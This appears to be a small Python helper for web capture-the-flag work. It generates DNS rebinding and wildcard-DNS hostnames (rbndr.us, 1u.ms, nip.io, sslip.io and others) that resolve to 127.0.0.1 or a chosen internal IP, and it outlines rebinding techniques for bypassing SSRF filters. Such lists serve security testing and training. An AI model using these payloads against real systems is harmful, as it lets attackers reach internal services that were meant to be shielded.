"""
DNS Rebinding Payload Crafter for Web CTF.
Covers DNS rebinding services, IP rotation techniques, and SSRF bypass via DNS.
"""

from typing import List, Dict


def get_dns_rebinding_services() -> List[Dict[str, str]]:
    """Generate DNS rebinding service URLs."""
    return [
        {
            "name": "rbndr.us",
            "payload": "7f000001.7f000001.rbndr.us",
            "desc": "DNS rebinding service - resolves to 127.0.0.1 on second query."
        },
        {
            "name": "1u.ms",
            "payload": "7f000001.1u.ms",
            "desc": "DNS rebinding service."
        },
        {
            "name": "nip.io (Wildcard DNS)",
            "payload": "127.0.0.1.nip.io",
            "desc": "Wildcard DNS that resolves to the IP in the subdomain."
        },
        {
            "name": "sslip.io (Wildcard DNS)",
            "payload": "127.0.0.1.sslip.io",
            "desc": "Wildcard DNS that resolves to the IP in the subdomain."
        },
        {
            "name": "xip.io (Wildcard DNS)",
            "payload": "127.0.0.1.xip.io",
            "desc": "Wildcard DNS that resolves to the IP in the subdomain."
        },
        {
            "name": "localtest.me",
            "payload": "127.0.0.1.localtest.me",
            "desc": "Resolves to 127.0.0.1."
        },
        {
            "name": "lvh.me",
            "payload": "lvh.me",
            "desc": "Resolves to 127.0.0.1."
        },
        {
            "name": "spoofed.burpcollaborator.net",
            "payload": "DNS rebinding via Burp Collaborator",
            "desc": "Burp Collaborator supports DNS rebinding."
        }
    ]


def get_dns_rebinding_techniques() -> List[Dict[str, str]]:
    """Generate DNS rebinding attack techniques."""
    return [
        {
            "name": "Two-IP Rebinding",
            "payload": "First query resolves to attacker IP, second to target IP",
            "desc": "Classic DNS rebinding: first resolution to attacker, second to internal target."
        },
        {
            "name": "TTL-Based Rebinding",
            "payload": "Set very low TTL (e.g. 0) to force rapid re-resolution",
            "desc": "Low TTL forces the browser to re-resolve the domain."
        },
        {
            "name": "Single-IP Rebinding",
            "payload": "Resolve to attacker IP, then rebind to internal IP",
            "desc": "Single domain that changes IP between queries."
        },
        {
            "name": "SSRF via DNS Rebinding",
            "payload": "Use rebinding domain in SSRF to reach internal services",
            "desc": "DNS rebinding bypasses SSRF IP filters."
        }
    ]


def get_dns_rebinding_payloads(target_ip: str = "127.0.0.1") -> List[Dict[str, str]]:
    """Generate DNS rebinding payloads for a target IP."""
    # Convert IP to hex for rbndr.us format
    octets = target_ip.split(".")
    hex_ip = "".join(f"{int(o):02x}" for o in octets)
    return [
        {
            "name": "rbndr.us Rebinding",
            "payload": f"{hex_ip}.{hex_ip}.rbndr.us",
            "desc": f"DNS rebinding to {target_ip} via rbndr.us."
        },
        {
            "name": "1u.ms Rebinding",
            "payload": f"{hex_ip}.1u.ms",
            "desc": f"DNS rebinding to {target_ip} via 1u.ms."
        },
        {
            "name": "nip.io Wildcard",
            "payload": f"{target_ip}.nip.io",
            "desc": f"Wildcard DNS resolving to {target_ip}."
        },
        {
            "name": "sslip.io Wildcard",
            "payload": f"{target_ip}.sslip.io",
            "desc": f"Wildcard DNS resolving to {target_ip}."
        }
    ]
